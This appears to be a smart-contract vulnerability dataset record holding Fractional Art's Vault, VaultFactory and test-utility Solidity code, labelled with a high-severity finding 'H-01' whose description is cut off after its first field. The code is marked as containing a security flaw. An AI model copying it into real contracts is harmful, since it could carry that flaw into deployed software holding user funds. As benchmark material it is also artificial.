[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Create2ClonesWithImmutableArgs} from \"clones-with-immutable-args/src/Create2ClonesWithImmutableArgs.sol\";\nimport {IVaultFactory} from \"./interfaces/IVaultFactory.sol\";\nimport {Vault} from \"./Vault.sol\";\n\n/// @title Vault Factory\n/// @author Fractional Art\n/// @notice Factory contract for deploying fractional vaults\ncontract VaultFactory is IVaultFactory {\n    /// @dev Use clones library for address types\n    using Create2ClonesWithImmutableArgs for address;\n    /// @notice Address of Vault proxy contract\n    address public implementation;\n    /// @dev Internal mapping to track the next seed to be used by an EOA\n    mapping(address => bytes32) internal nextSeeds;\n\n    /// @notice Initializes implementation contract\n    constructor() {\n        implementation = address(new Vault());\n    }\n\n    /// @notice Deploys new vault for sender\n    /// @return vault Address of deployed vault\n    function deploy() external returns (address payable vault) {\n        vault = deployFor(msg.sender);\n    }\n\n    /// @notice Gets pre-computed address of vault deployed by given account\n    /// @param _deployer Address of vault deployer\n    /// @return vault Address of next vault\n    function getNextAddress(address _deployer)\n        external\n        view\n        returns (address vault)\n    {\n        bytes32 salt = keccak256(abi.encode(_deployer, nextSeeds[_deployer]));\n        (uint256 creationPtr, uint256 creationSize) = implementation\n            .cloneCreationCode(abi.encodePacked());\n\n        bytes32 creationHash;\n        assembly {\n            creationHash := keccak256(creationPtr, creationSize)\n        }\n        bytes32 data = keccak256(\n            abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)\n        );\n        vault = address(uint160(uint256(data)));\n    }\n\n    /// @notice Gets next seed value of given account\n    /// @param _deployer Address of vault deployer\n    /// @return Value of next seed\n    function getNextSeed(address _deployer) external view returns (bytes32) {\n        return nextSeeds[_deployer];\n    }\n\n    /// @notice Deploys new vault for given address\n    /// @param _owner Address of vault owner\n    /// @return vault Address of deployed vault\n    function deployFor(address _owner) public returns (address payable vault) {\n        bytes32 seed = nextSeeds[tx.origin];\n\n        // Prevent front-running the salt by hashing the concatenation of tx.origin and the user-provided seed.\n        bytes32 salt = keccak256(abi.encode(tx.origin, seed));\n\n        bytes memory data = abi.encodePacked();\n        vault = implementation.clone(salt, data);\n        Vault(vault).init();\n\n        // Transfer the ownership from this factory contract to the specified owner.\n        Vault(vault).transferOwnership(_owner);\n\n        // Increment the seed.\n        unchecked {\n            nextSeeds[tx.origin] = bytes32(uint256(seed) + 1);\n        }\n\n        // Log the vault via en event.\n        emit DeployVault(\n            tx.origin,\n            msg.sender,\n            _owner,\n            seed,\n            salt,\n            address(vault)\n        );\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport {Blacksmith} from \"./blacksmith/Blacksmith.sol\";\nimport {BaseVault, BaseVaultBS} from \"./blacksmith/BaseVault.bs.sol\";\nimport {Buyout, BuyoutBS} from \"./blacksmith/Buyout.bs.sol\";\nimport {FERC1155, FERC1155BS} from \"./blacksmith/FERC1155.bs.sol\";\nimport {Metadata, MetadataBS} from \"./blacksmith/Metadata.bs.sol\";\nimport {Migration, MigrationBS} from \"./blacksmith/Migration.bs.sol\";\nimport {Minter} from \"../src/modules/Minter.sol\";\nimport {MockModule} from \"../src/mocks/MockModule.sol\";\nimport {MockERC20, MockERC20BS} from \"./blacksmith/MockERC20.bs.sol\";\nimport {MockERC721, MockERC721BS} from \"./blacksmith/MockERC721.bs.sol\";\nimport {MockERC1155, MockERC1155BS} from \"./blacksmith/MockERC1155.bs.sol\";\nimport {NFTReceiver} from \"../src/utils/NFTReceiver.sol\";\nimport {Supply, SupplyBS} from \"./blacksmith/Supply.bs.sol\";\nimport {Transfer, TransferBS} from \"./blacksmith/Transfer.bs.sol\";\nimport {TransferReference} from \"../src/references/TransferReference.sol\";\nimport {Vault, VaultBS} from \"./blacksmith/Vault.bs.sol\";\nimport {VaultFactory, VaultFactoryBS} from \"./blacksmith/VaultFactory.bs.sol\";\nimport {VaultRegistry, VaultRegistryBS} from \"./blacksmith/VaultRegistry.bs.sol\";\nimport {WETH} from \"@rari-capital/solmate/src/tokens/WETH.sol\";\n\nimport {IBuyout, State} from \"../src/interfaces/IBuyout.sol\";\nimport {IERC20} from \"../src/interfaces/IERC20.sol\";\nimport {IERC721} from \"../src/interfaces/IERC721.sol\";\nimport {IERC1155} from \"../src/interfaces/IERC1155.sol\";\nimport {IFERC1155} from \"../src/interfaces/IFERC1155.sol\";\nimport {IMigration} from \"../src/interfaces/IMigration.sol\";\nimport {IModule} from \"../src/interfaces/IModule.sol\";\nimport {IVault} from \"../src/interfaces/IVault.sol\";\nimport {IVaultFactory} from \"../src/interfaces/IVaultFactory.sol\";\nimport {IVaultRegistry} from \"../src/interfaces/IVaultRegistry.sol\";\n\nimport \"../src/constants/Permit.sol\";\n\ncontract TestUtil is Test {\n    BaseVault baseVault;\n    Buyout buyoutModule;\n    Metadata metadata;\n    Migration migrationModule;\n    Minter minter;\n    MockModule mockModule;\n    NFTReceiver receiver;\n    Supply supplyTarget;\n    Transfer transferTarget;\n    Vault vaultProxy;\n    VaultRegistry registry;\n    WETH weth;\n\n    FERC1155BS fERC1155;\n\n    struct User {\n        address addr;\n        uint256 pkey;\n        Blacksmith base;\n        BaseVaultBS baseVault;\n        BuyoutBS buyoutModule;\n        MigrationBS migrationModule;\n        MockERC721BS erc721;\n        MockERC1155BS erc1155;\n        MockERC20BS erc20;\n        TransferBS transfer;\n        VaultRegistryBS registry;\n        FERC1155BS ferc1155;\n        VaultBS vaultProxy;\n    }\n\n    User alice;\n    User bob;\n    User eve;\n    address buyout;\n    address erc20;\n    address erc721;\n    address erc1155;\n    address factory;\n    address migration;\n    address token;\n    address vault;\n    bool approved;\n    uint256 deadline;\n    uint256 nonce;\n    uint256 proposalPeriod;\n    uint256 rejectionPeriod;\n    uint256 tokenId;\n\n    address[] modules = new address[](2);\n\n    bytes32 merkleRoot;\n    bytes32[] merkleTree;\n    bytes32[] hashes = new bytes32[](6);\n    bytes32[] mintProof = new bytes32[](3);\n    bytes32[] burnProof = new bytes32[](3);\n    bytes32[] erc20TransferProof = new bytes32[](3);\n    bytes32[] erc721TransferProof = new bytes32[](3);\n    bytes32[] erc1155TransferProof = new bytes32[](3);\n    bytes32[] erc1155BatchTransferProof = new bytes32[](3);\n\n    bytes4[] nftReceiverSelectors = new bytes4[](0);\n    address[] nftReceiverPlugins = new address[](0);\n\n    uint256 constant INITIAL_BALANCE = 100 ether;\n    uint256 constant TOTAL_SUPPLY = 10000;\n    uint256 constant HALF_SUPPLY = TOTAL_SUPPLY / 2;\n    address constant WETH_ADDRESS =\n        address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    /// =================\n    /// ===== USERS =====\n    /// =================\n    function createUser(address _addr, uint256 _privateKey)\n        public\n        returns (User memory)\n    {\n        Blacksmith base = new Blacksmith(_addr, _privateKey);\n        BaseVaultBS _minter = new BaseVaultBS(\n            _addr,\n            _privateKey,\n            address(baseVault)\n        );\n        BuyoutBS _buyout = new BuyoutBS(\n            _addr,\n            _privateKey,\n            address(buyoutModule)\n        );\n        MigrationBS _migration = new MigrationBS(\n            _addr,\n            _privateKey,\n            address(migrationModule)\n        );\n        MockERC721BS _erc721 = new MockERC721BS(\n            _addr,\n            _privateKey,\n            address(erc721)\n        );\n        MockERC1155BS _erc1155 = new MockERC1155BS(\n            _addr,\n            _privateKey,\n            address(erc1155)\n        );\n        MockERC20BS _erc20 = new MockERC20BS(\n            _addr,\n            _privateKey,\n            address(erc20)\n        );\n        TransferBS _transfer = new TransferBS(\n            _addr,\n            _privateKey,\n            address(transferTarget)\n        );\n        VaultRegistryBS _registry = new VaultRegistryBS(\n            _addr,\n            _privateKey,\n            address(registry)\n        );\n        FERC1155BS _ferc1155 = new FERC1155BS(_addr, _privateKey, address(0));\n        VaultBS _proxy = new VaultBS(_addr, _privateKey, address(0));\n        base.deal(INITIAL_BALANCE);\n        return\n            User(\n                base.addr(),\n                base.pkey(),\n                base,\n                _minter,\n                _buyout,\n                _migration,\n                _erc721,\n                _erc1155,\n                _erc20,\n                _transfer,\n                _registry,\n                _ferc1155,\n                _proxy\n            );\n    }\n\n    /// ==================\n    /// ===== SETUPS =====\n    /// ==================\n    function setUpContract() public {\n        registry = new VaultRegistry();\n        supplyTarget = new Supply(address(registry));\n        minter = new Minter(address(supplyTarget));\n        transferTarget = new Transfer();\n        receiver = new NFTReceiver();\n        buyoutModule = new Buyout(\n            address(registry),\n            address(supplyTarget),\n            address(transferTarget)\n        );\n        migrationModule = new Migration(\n            address(buyoutModule),\n            address(registry),\n            address(supplyTarget)\n        );\n        baseVault = new BaseVault(address(registry), address(supplyTarget));\n        erc20 = address(new MockERC20());\n        erc721 = address(new MockERC721());\n        erc1155 = address(new MockERC1155());\n\n        vm.label(address(registry), \"VaultRegistry\");\n        vm.label(address(supplyTarget), \"SupplyTarget\");\n        vm.label(address(transferTarget), \"TransferTarget\");\n        vm.label(address(baseVault), \"BaseVault\");\n        vm.label(address(buyoutModule), \"BuyoutModule\");\n        vm.label(address(migrationModule), \"MigrationModule\");\n        vm.label(address(erc20), \"ERC20\");\n        vm.label(address(erc721), \"ERC721\");\n        vm.label(address(erc1155), \"ERC1155\");\n\n        setUpWETH();\n        setUpProof();\n    }\n\n    function setUpWETH() public {\n        WETH _weth = new WETH();\n        bytes memory code = address(_weth).code;\n        vm.etch(WETH_ADDRESS, code);\n        weth = WETH(payable(WETH_ADDRESS));\n\n        vm.label(WETH_ADDRESS, \"WETH\");\n    }\n\n    function setUpProof() public {\n        modules[0] = address(baseVault);\n        modules[1] = address(buyoutModule);\n\n        hashes[0] = baseVault.getLeafNodes()[0];\n        hashes[1] = buyoutModule.getLeafNodes()[0];\n        hashes[2] = buyoutModule.getLeafNodes()[1];\n        hashes[3] = buyoutModule.getLeafNodes()[2];\n        hashes[4] = buyoutModule.getLeafNodes()[3];\n        hashes[5] = buyoutModule.getLeafNodes()[4];\n\n        merkleTree = baseVault.generateMerkleTree(modules);\n        merkleRoot = baseVault.getRoot(merkleTree);\n        mintProof = baseVault.getProof(hashes, 0);\n        burnProof = baseVault.getProof(hashes, 1);\n        erc20TransferProof = baseVault.getProof(hashes, 2);\n        erc721TransferProof = baseVault.getProof(hashes, 3);\n        erc1155TransferProof = baseVault.getProof(hashes, 4);\n        erc1155BatchTransferProof = baseVault.getProof(hashes, 5);\n    }\n\n    function setUpUser(uint256 _privateKey, uint256 _tokenId)\n        public\n        returns (User memory user)\n    {\n        user = createUser(address(0), _privateKey);\n        MockERC721(erc721).mint(user.addr, _tokenId);\n    }\n\n    /// =======================\n    /// ===== VAULT PROXY =====\n    /// =======================\n    function setUpExecute(User memory _user)\n        public\n        returns (bytes memory data)\n    {\n        IVault(vault).init();\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        IVault(vault).install(nftReceiverSelectors, nftReceiverPlugins);\n        _user.erc721.safeTransferFrom(_user.addr, vault, 1);\n        data = abi.encodeCall(\n            transferTarget.ERC721TransferFrom,\n            (address(erc721), vault, _user.addr, 1)\n        );\n    }\n\n    /// ==========================\n    /// ===== VAULT REGISTRY =====\n    /// ==========================\n    function setUpCreateFor(User memory _user) public {\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        vault = registry.createFor(\n            merkleRoot,\n            _user.addr,\n            nftReceiverPlugins,\n            nftReceiverSelectors\n        );\n\n        vm.label(vault, \"VaultProxy\");\n    }\n\n    /// ====================\n    /// ===== FERC1155 =====\n    /// ====================\n    function setUpPermit(\n        User memory _user,\n        bool _approved,\n        uint256 _deadline\n    ) public {\n        approved = _approved;\n        deadline = _deadline;\n        _user.erc721.safeTransferFrom(_user.addr, vault, 1);\n        (token, tokenId) = registry.vaultToToken(vault);\n        nonce = IFERC1155(token).nonces(_user.addr);\n        setUpFERC1155(_user, token);\n\n        vm.label(vault, \"VaultProxy\");\n    }\n\n    function setUpMetadata(User memory _user) public {\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        (vault, token) = registry.createCollectionFor(\n            merkleRoot,\n            _user.addr,\n            nftReceiverPlugins,\n            nftReceiverSelectors\n        );\n        (, tokenId) = registry.vaultToToken(address(vault));\n        setUpFERC1155(_user, token);\n        metadata = new Metadata(fERC1155.proxyContract());\n\n        vm.label(address(metadata), \"Metadata\");\n    }\n\n    function setUpFERC1155(User memory _user, address _ferc1155) public {\n        fERC1155 = new FERC1155BS(address(0), _user.pkey, _ferc1155);\n\n        vm.label(token, \"Token\");\n    }\n\n    /// ======================\n    /// ===== BASE VAULT =====\n    /// ======================\n    function deployBaseVault(User memory _user, uint256 _fractions) public {\n        vault = _user.baseVault.deployVault(\n            _fractions,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            mintProof\n        );\n        _user.erc721.safeTransferFrom(_user.addr, vault, 1);\n        vm.label(vault, \"VaultProxy\");\n    }\n\n    function setUpMulticall(User memory _user) public {\n        MockERC20(erc20).mint(_user.addr, 10);\n        MockERC721(erc721).mint(_user.addr, 2);\n        MockERC721(erc721).mint(_user.addr, 3);\n        mintERC1155(_user.addr, 2);\n\n        _user.erc20.approve(address(baseVault), 10);\n        _user.erc721.setApprovalForAll(address(baseVault), true);\n        _user.erc1155.setApprovalForAll(address(baseVault), true);\n    }\n\n    /// ==================\n    /// ===== BUYOUT =====\n    /// ==================\n    function setUpBuyout(\n        User memory _user1,\n        User memory _user2,\n        uint256 _fractions\n    ) public {\n        deployBaseVault(_user1, _fractions);\n        (token, tokenId) = registry.vaultToToken(vault);\n        _user1.ferc1155 = new FERC1155BS(address(0), 111, token);\n        _user2.ferc1155 = new FERC1155BS(address(0), 222, token);\n\n        buyout = address(buyoutModule);\n        proposalPeriod = buyoutModule.PROPOSAL_PERIOD();\n        rejectionPeriod = buyoutModule.REJECTION_PERIOD();\n\n        vm.label(vault, \"VaultProxy\");\n        vm.label(token, \"Token\");\n    }\n\n    function setUpBuyoutCash(User memory _user1, User memory _user2) public {\n        _user2.buyoutModule.start{value: 1 ether}(vault);\n        _user1.buyoutModule.sellFractions(vault, 1000);\n        vm.warp(rejectionPeriod + 1);\n        _user2.buyoutModule.end(vault, burnProof);\n    }\n\n    function setUpWithdrawERC721(User memory _user1, User memory _user2)\n        public\n    {\n        _user2.erc721.safeTransferFrom(_user2.addr, vault, 2);\n        _user2.buyoutModule.start{value: 1 ether}(vault);\n        _user1.buyoutModule.sellFractions(vault, 1000);\n        vm.warp(rejectionPeriod + 1);\n        _user2.buyoutModule.end(vault, burnProof);\n        _user1.buyoutModule.cash(vault, burnProof);\n    }\n\n    function setUpWithdrawERC1155(User memory _user1, User memory _user2)\n        public\n    {\n        mintERC1155(vault, 1);\n        _user2.buyoutModule.start{value: 1 ether}(vault);\n        _user1.buyoutModule.sellFractions(vault, 1000);\n        vm.warp(rejectionPeriod + 1);\n        _user2.buyoutModule.end(vault, burnProof);\n        _user1.buyoutModule.cash(vault, burnProof);\n    }\n\n    function mintERC1155(address _to, uint256 _count) public {\n        for (uint256 i = 1; i <= _count; i++) {\n            MockERC1155(erc1155).mint(_to, i, 10, \"\");\n        }\n    }\n\n    function setUpBatchWithdrawERC1155(User memory _user1, User memory _user2)\n        public\n    {\n        mintERC1155(vault, 3);\n        _user2.buyoutModule.start{value: 1 ether}(vault);\n        _user1.buyoutModule.sellFractions(vault, 1000);\n        vm.warp(rejectionPeriod + 1);\n        _user2.buyoutModule.end(vault, burnProof);\n        _user1.buyoutModule.cash(vault, burnProof);\n    }\n\n    function setUpWithdrawERC20(User memory _user1, User memory _user2) public {\n        MockERC20(erc20).mint(vault, 10);\n        _user2.buyoutModule.start{value: 1 ether}(vault);\n        _user1.buyoutModule.sellFractions(vault, 1000);\n        vm.warp(rejectionPeriod + 1);\n        _user2.buyoutModule.end(vault, burnProof);\n        _user1.buyoutModule.cash(vault, burnProof);\n    }\n\n    /// ===========================\n    /// ===== MIGRATION ===========\n    /// ===========================\n    function setUpMigration(\n        User memory _user1,\n        User memory _user2,\n        uint256 _fractions\n    ) public {\n        deployBaseVault(_user1, _fractions);\n        (token, tokenId) = registry.vaultToToken(vault);\n        _user1.ferc1155 = new FERC1155BS(address(0), 111, token);\n        _user2.ferc1155 = new FERC1155BS(address(0), 222, token);\n\n        mockModule = new MockModule();\n        buyout = address(buyoutModule);\n        migration = address(migrationModule);\n        proposalPeriod = buyoutModule.PROPOSAL_PERIOD();\n        rejectionPeriod = buyoutModule.REJECTION_PERIOD();\n\n        vm.label(vault, \"VaultProxy\");\n        vm.label(token, \"Token\");\n    }\n\n    /// ===========================\n    /// ===== INITIALIZATIONS =====\n    /// ===========================\n    function initializeDeploy() public view returns (bytes memory deployVault) {\n        deployVault = abi.encodeCall(\n            baseVault.deployVault,\n            (\n                TOTAL_SUPPLY,\n                modules,\n                nftReceiverPlugins,\n                nftReceiverSelectors,\n                mintProof\n            )\n        );\n    }\n\n    function initializeDepositERC20(uint256 _amount)\n        public\n        view\n        returns (bytes memory depositERC721)\n    {\n        address[] memory tokens = new address[](1);\n        tokens[0] = erc20;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = _amount;\n\n        depositERC721 = abi.encodeCall(\n            baseVault.batchDepositERC20,\n            (alice.addr, vault, tokens, amounts)\n        );\n    }\n\n    function initializeDepositERC721(uint256 _count)\n        public\n        view\n        returns (bytes memory depositERC721)\n    {\n        address[] memory nfts = new address[](_count);\n        uint256[] memory tokenIds = new uint256[](_count);\n        for (uint256 i; i < _count; i++) {\n            nfts[i] = erc721;\n            tokenIds[i] = i + 2;\n        }\n\n        depositERC721 = abi.encodeCall(\n            baseVault.batchDepositERC721,\n            (alice.addr, vault, nfts, tokenIds)\n        );\n    }\n\n    function initializeDepositERC1155(uint256 _count)\n        public\n        view\n        returns (bytes memory depositERC1155)\n    {\n        address[] memory nfts = new address[](_count);\n        uint256[] memory tokenIds = new uint256[](_count);\n        uint256[] memory amounts = new uint256[](_count);\n        bytes[] memory data = new bytes[](_count);\n        for (uint256 i; i < _count; i++) {\n            nfts[i] = erc1155;\n            tokenIds[i] = i + 1;\n            amounts[i] = 10;\n            data[i] = \"\";\n        }\n\n        depositERC1155 = abi.encodeCall(\n            baseVault.batchDepositERC1155,\n            (alice.addr, vault, nfts, tokenIds, amounts, data)\n        );\n    }\n\n    function initializeNFTReceiver()\n        public\n        view\n        returns (bytes4[] memory, address[] memory)\n    {\n        address[] memory plugins = new address[](3);\n        bytes4[] memory selectors = new bytes4[](3);\n\n        (plugins[0], plugins[1], plugins[2]) = (\n            address(receiver),\n            address(receiver),\n            address(receiver)\n        );\n        (selectors[0], selectors[1], selectors[2]) = (\n            receiver.onERC1155Received.selector,\n            receiver.onERC1155BatchReceived.selector,\n            receiver.onERC721Received.selector\n        );\n        return (selectors, plugins);\n    }\n\n    function initializeBuyout(\n        User memory _user1,\n        User memory _user2,\n        uint256 _totalSupply,\n        uint256 _amount,\n        bool _approval\n    ) public {\n        setUpBuyout(_user1, _user2, _totalSupply);\n        _user1.ferc1155.safeTransferFrom(\n            _user1.addr,\n            _user2.addr,\n            1,\n            _amount,\n            \"\"\n        );\n        setApproval(_user1, vault, _approval);\n        setApproval(_user1, buyout, _approval);\n        setApproval(_user2, vault, _approval);\n        setApproval(_user2, buyout, _approval);\n    }\n\n    function initializeMigration(\n        User memory _user1,\n        User memory _user2,\n        uint256 _totalSupply,\n        uint256 _amount,\n        bool _approval\n    ) public {\n        setUpMigration(_user1, _user2, _totalSupply);\n        _user1.ferc1155.safeTransferFrom(\n            _user1.addr,\n            _user2.addr,\n            1,\n            _amount,\n            \"\"\n        );\n        setApproval(_user1, vault, _approval);\n        setApproval(_user1, migration, _approval);\n        setApproval(_user2, vault, _approval);\n        setApproval(_user2, migration, _approval);\n    }\n\n    function initializeERC721Migration(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _tokenId\n    ) public view returns (bytes memory migrateERC721) {\n        migrateERC721 = abi.encodeCall(\n            migrationModule.migrateVaultERC721,\n            (_vault, _proposalId, erc721, _tokenId, erc721TransferProof)\n        );\n    }\n\n    function initializeWithdrawalERC721(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) public view returns (bytes memory withdrawERC721) {\n        withdrawERC721 = abi.encodeCall(\n            buyoutModule.withdrawERC721,\n            (_from, erc721, _to, _tokenId, erc721TransferProof)\n        );\n    }\n\n    function initializeWithdrawalERC1155(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) public view returns (bytes memory withdrawERC1155) {\n        withdrawERC1155 = abi.encodeCall(\n            buyoutModule.withdrawERC1155,\n            (_from, erc1155, _to, _id, _amount, erc1155TransferProof)\n        );\n    }\n\n    function initializeBatchWithdrawalERC1155(\n        address _from,\n        address _to,\n        uint256 _count\n    ) public view returns (bytes memory batchWithdrawERC1155) {\n        uint256[] memory ids = new uint256[](_count);\n        uint256[] memory amounts = new uint256[](_count);\n        for (uint256 i; i < _count; i++) {\n            ids[i] = i + 1;\n            amounts[i] = 10;\n        }\n\n        batchWithdrawERC1155 = abi.encodeCall(\n            buyoutModule.batchWithdrawERC1155,\n            (\n                _from,\n                address(erc1155),\n                _to,\n                ids,\n                amounts,\n                erc1155BatchTransferProof\n            )\n        );\n    }\n\n    function initializeBatchMigrationERC1155(\n        address _vault,\n        uint256 _proposalId,\n        uint256[] memory _ids,\n        uint256[] memory _amounts\n    ) public view returns (bytes memory batchMigrationERC1155) {\n        batchMigrationERC1155 = abi.encodeCall(\n            migrationModule.batchMigrateVaultERC1155,\n            (\n                _vault,\n                _proposalId,\n                address(erc1155),\n                _ids,\n                _amounts,\n                erc1155BatchTransferProof\n            )\n        );\n    }\n\n    function initializeWithdrawalERC20(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) public view returns (bytes memory withdrawERC20) {\n        withdrawERC20 = abi.encodeCall(\n            buyoutModule.withdrawERC20,\n            (_from, erc20, _to, _amount, erc20TransferProof)\n        );\n    }\n\n    function initializeERC20Migration(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) public view returns (bytes memory migrateERC20) {\n        migrateERC20 = abi.encodeCall(\n            migrationModule.migrateVaultERC20,\n            (_vault, _proposalId, erc20, _amount, erc20TransferProof)\n        );\n    }\n\n    /// ===================\n    /// ===== HELPERS =====\n    /// ===================\n    function setApproval(\n        User memory _user,\n        address _to,\n        bool _approval\n    ) public {\n        _user.ferc1155.setApprovalForAll(_to, _approval);\n    }\n\n    function getFractionBalance(address _account)\n        public\n        view\n        returns (uint256)\n    {\n        return IERC1155(token).balanceOf(_account, tokenId);\n    }\n\n    function getETHBalance(address _account) public view returns (uint256) {\n        return _account.balance;\n    }\n\n    function revertBuyoutState(State _expected, State _actual) public {\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                IBuyout.InvalidState.selector,\n                _expected,\n                _actual\n            )\n        );\n    }\n\n    /// ======================\n    /// ===== SIGNATURES =====\n    /// ======================\n    function computeDigest(bytes32 _domainSeparator, bytes32 _structHash)\n        public\n        pure\n        returns (bytes32)\n    {\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash)\n            );\n    }\n\n    function computeDomainSeparator() public view returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    DOMAIN_TYPEHASH,\n                    keccak256(bytes(\"FERC1155\")),\n                    keccak256(bytes(\"1\")),\n                    block.chainid,\n                    token\n                )\n            );\n    }\n\n    function signPermit(\n        User memory _owner,\n        address _operator,\n        bool _bool,\n        uint256 _nonce,\n        uint256 _deadline\n    )\n        public\n        returns (\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        )\n    {\n        bytes32 structHash = keccak256(\n            abi.encode(\n                PERMIT_TYPEHASH,\n                _owner.addr,\n                _operator,\n                tokenId,\n                _bool,\n                _nonce++,\n                _deadline\n            )\n        );\n\n        (v, r, s) = _owner.base.sign(\n            computeDigest(computeDomainSeparator(), structHash)\n        );\n    }\n\n    function signPermitAll(\n        User memory _owner,\n        address _operator,\n        bool _bool,\n        uint256 _nonce,\n        uint256 _deadline\n    )\n        public\n        returns (\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        )\n    {\n        bytes32 structHash = keccak256(\n            abi.encode(\n                PERMIT_ALL_TYPEHASH,\n                _owner.addr,\n                _operator,\n                _bool,\n                _nonce++,\n                _deadline\n            )\n        );\n\n        (v, r, s) = _owner.base.sign(\n            computeDigest(computeDomainSeparator(), structHash)\n        );\n    }\n}\n\n\n",
        "CodeNames": [
            "Vault.sol",
            "VaultFactory.sol",
            "TestUtil.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
